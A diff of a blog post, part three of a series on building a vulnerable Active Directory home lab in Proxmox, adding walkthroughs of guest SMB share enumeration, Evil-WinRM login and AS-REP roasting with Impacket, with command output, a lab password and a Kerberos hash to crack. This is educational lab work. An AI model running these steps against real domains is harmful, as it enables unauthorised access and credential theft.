@@ -1,8 +1,8 @@
 ---
 layout: single
-title:  "Building an Active Directory Home Lab with Proxmox - Part 3: Make it Vulnerable"
+title:  "Building an Active Directory Home Lab with Proxmox - Part 3: Making it Vulnerable"
 seo_title: "Setting up and Active Directory (AD) Home Lab with Proxmox VE Part 3"
-date:   2024-03-28 17:26:00 +0200
+date:   2024-03-30 18:38:00 +0200
 categories: ['Active-Directory', 'Homelab']
 classes: wide
 toc: true
@@ -77,7 +77,7 @@ I found that when applying the GPO to the domain, I was still not able to WinRM 
 
 ![vulnerability-setup-7.1](../assets/images/homelab/vuln-setup-7.1.png)
 
-## Adding a Public SMB Share
+## Adding a Public File Share
 
 ### Local Share
 Login as a local administator to one of your Windows VMs and navigate to `Control Panel > Network and Internet > Network and Sharing Center > Change Advanced sharing settings > Guest or Public > Turn on File and Printer sharing`.
@@ -103,12 +103,32 @@ gpupdate /force
 ```
 Now whenever a new device joins our AD environment the Group Policies that apply to all the devices will automatically be applied to them. With this, we have completed the Domain Controller setup.
 
-# Validating our Configurations
+# Account Misconfigurations
+## ASREP Roasting
+In older versions of Kerberos, it was possible to allow authentication without a password. Since Kerberos 5, a password is required, which is called `Pre-Authentication`. If an account has the option `Do not require Kerberos preauthentication` checked, an attacker can send any request for authentication to the KDC to retrieve an encrypted TGT that can be brute-forced offline.
+
+![asreproast-enable](../assets/images/homelab/vuln-setup-10.png)
+
+# Attacking our Environment
+## Browsing Public Shares
 Lets start by checking if we can see any available shares on the network. I made one public share on the Windows VM with IP `172.16.200.11`. In Part 1 of this series we added an attacker VM to the AD network as our initial entry point that is whitelisted from the firewall. From this host, we should be able to list the share we made public.
 
-![ad-attack-1](../assets/images/homelab/ad-attack-1.png)
+```bash
+$ nxc smb 172.16.200.11 -u 'guest' -p '' --shares
 
-We can see one public folder called `Department`. We can now see what information is stored in there.
+SMB         172.16.200.11   445    MS01             [*] Windows 10 Pro 19045 x64 (name:MS01) (domain:cicada.local)
+SMB         172.16.200.11   445    MS01             [+] cicada.local\guest: 
+SMB         172.16.200.11   445    MS01             [*] Enumerated shares
+SMB         172.16.200.11   445    MS01             Share           Permissions     Remark
+SMB         172.16.200.11   445    MS01             -----           -----------     ------
+SMB         172.16.200.11   445    MS01             ADMIN$                          Remote Admin
+SMB         172.16.200.11   445    MS01             C$                              Default share
+SMB         172.16.200.11   445    MS01             Department      READ            
+SMB         172.16.200.11   445    MS01             IPC$                            Remote IPC
+SMB         172.16.200.11   445    MS01             Users           READ
+```
+
+We can see one public folder called `Department` and look at what information is stored inside.
 ```bash
 $ smbclient -U 'guest%' \\\\172.16.200.11\\Department
 Try "help" to get a list of possible commands.
@@ -121,9 +141,8 @@ Informational                       D        0  Tue Feb 20 12:06:19 2024
 smb: \> more flag.txt
 Br0wsing_F1L3_Sh4r3S_FTW!
 ```
-Awesome! Seems like we got some juicy information.
-
-To verify that we can also WinRM to our Windows VMs I created a new user called `winnie.wonder` with the password `P@ssw0rd123` and logged into `MS01` with this account. By default, PowerShell Remoting (and WinRM) only allows connections from members of the Administrators or Remote Management Group. To add our user to the Built-In Remote Management Users run:
+## Evil-WinRM
+To verify that we can also WinRM to our Windows VMs I created a honeypot account called `winnie.wonder` with the password `P@ssw0rd123` and logged into `MS01` with this account. By default, PowerShell Remoting (and WinRM) only allows connections from members of the Administrators or Remote Management Group. To add our user to the Built-In Remote Management Users run:
 ```bash
 PS C:/> net localgroup "Remote Management Users" /add winnie.wonder
 ```
@@ -146,3 +165,20 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\winnie.wonder.CICADA\Documents> whoami
 cicada\winnie.wonder
 ```
+
+## ASREPRoasting
+Assuming we have gathered a list of valid users, we can try to perform an ASREPRoast attack on the domain users to see if any account has the `Do not require Kerberos preauthentication` option set. With a valid list of users, we can use [Get-NPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required.
+```bash
+GetNPUsers.py CICADA.LOCAL/ -dc-ip 172.16.200.100 -no-pass -usersfile valid_users -format hashcat
+
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] User Administrator doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User dave.hoggins doesnt have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$winnie.wonder@CICADA.LOCAL:ab15aee9c9bd66ee5a0c56e4a30395b9$d030a2c1ab87c23f4424d1cc39f2a469353a2a7fc26c451790729a23bb9658282c7349edb3d67af46072d4b0fe36f9bc71db8d6f7e21f852c809a242c050a77fb0f6c28fb8b7b79de5c4ff60dfa84dd73792f38bf886f909fa3a206c8ac8e594b64ac2c067f4162a6a8e194e4a6fc9b11f8e0d89b0ab379511b3aeab364534fd24509441c301ce1f654bc5e9bf46892418d9ffadcf3992b9493ecdbc1ad142497dcb9323ec1ffcfc72a26efee2ec07a41998bc0a9568eda93b24e84f18abe69004d43a60da7568093f1f88202c21d3abc3078e969ddde45202865ee5af4ded1be7bddffc24da7637c5a53ec2
+```
+
+Look like we got a valid hash for the user `winnie.wonder`. We can crack the hashes offline using Hashcat with mode `18200` to find the password.
+
+# Conclusion
+The possible attack surface in an AD environment is very large so we just introduced a few misconfigurations in our home lab. We also went over on how an outsider can find these flaws to possible gain a foothold on one of our systems. In the next part of this series we will look at how we can monitor and defend against these attacks.
